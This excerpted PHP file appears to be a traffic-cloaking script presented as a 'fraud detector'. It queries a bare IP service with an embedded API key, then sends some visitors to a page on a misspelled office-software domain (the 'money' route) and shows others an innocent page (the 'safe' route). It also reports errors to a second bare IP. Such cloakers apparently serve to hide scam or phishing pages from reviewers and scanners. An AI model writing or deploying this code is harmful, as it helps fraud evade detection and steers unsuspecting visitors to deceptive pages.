<?php
class FraudBusterDetector_73ltonoqmd {
    ...
    function moneyAction($resultObj) {
        ...
        $url = "http://allofficeolutions.online/sctliPiHis/index.html";
    ...
    function safeAction($resultObj) {
        $getParams = (isset($resultObj->getParams)) ? $resultObj->getParams : '';
        $url = "http://quetta.online/index.php/home/about_us";
...
//        }
    ...
    function sendRequestAndGetResult2($testConnection) {
        ...
        $url = "http://107.178.254.160/fb2?clid=73ltonoqmd&apikey=1b4895a7e31fa11168d976adbbce17f39&hash=-1784546580";
        $nParam = '9ec1b60n';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://192.81.209.149/fb-notify.html?v=2&cf=false&guid=73ltonoqmd&m='.$message;
        $ch = curl_init($url);
...
$fraudBusterDetector_73ltonoqmd = new FraudBusterDetector_73ltonoqmd();
$fraudBusterDetector_73ltonoqmd->check();
